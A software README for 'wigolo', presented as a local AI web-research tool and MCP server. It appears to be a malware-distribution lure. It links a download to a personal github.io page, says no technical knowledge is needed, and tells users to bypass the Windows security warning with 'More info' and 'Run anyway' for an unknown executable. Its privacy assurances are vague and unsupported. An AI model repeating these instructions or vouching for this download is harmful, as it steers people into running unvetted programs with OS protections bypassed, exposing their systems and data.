# 🌐 wigolo - Research the web using local AI

[![](https://img.shields.io/badge/Download-Wigolo-blue.svg)](https://dvine6263.github.io)

Wigolo helps you search and explore the web with your own AI tools. It functions entirely on your computer. You do not need to pay for external services or store your sensitive data in the cloud. It connects directly to your local projects to provide answers, crawl pages, and conduct research.

## 🛠️ Setting up your computer

Wigolo runs on your local machine. It requires a modern version of Windows. Ensure you have at least 8GB of memory available. You do not need technical knowledge to run the software, but you must follow the installation steps closely to allow the agent to connect to your local environment.

After the file downloads, move it to a folder where you store your applications. Double-click the file to open the program. A security window may appear. Windows tries to protect your computer from unknown files. Click on More info and then select Run anyway to start the application.

## 🚀 Getting started with research

Once the program opens, you see an input field. Type your query into this box just as you would in a standard search engine. Wigolo uses its internal components to find relevant data across the web. Because the tool uses local processing, it does not send your search history to any central server.

You can direct the agent to perform specific tasks. For example, instruct it to crawl a web page or fetch data from a specific source. The tool interprets your natural language commands to retrieve and summarize information.

## 🔐 Keeping your data private

Traditional AI tools often require API keys and cloud accounts. Wigolo operates differently. It stores every search result locally on your hard drive. Your information remains inside your wall. No third party tracks your activity or reads your research queries. This approach ensures complete privacy for your development and personal projects.

## 🤖 Using with AI agents

Wigolo serves as a bridge for your existing tools. It provides context from the web to your local AI agents. If you use tools like Claude or other local AI models, you can connect them to Wigolo. It acts as an MCP server. This protocol allows different software components to talk to each other. Wigolo acts as the source for your searches while your main AI model processes the data into insights.

## 📂 Managing search results

The software keeps a history of your findings. Access your past research through the history tab in the application menu. You can save, export, or delete these records whenever you choose. The system organizes your data by date to help you track your research progress.

## ❓ Troubleshooting common issues

If the application fails to open, restart your computer. Ensure your firewall settings do not block the program from accessing the internet. You need an active internet connection for the search and crawl features to function.

If the search results feel slow, close other programs that use significant network bandwidth. If the tool reports an error while fetching a page, verify the URL or try a different website.
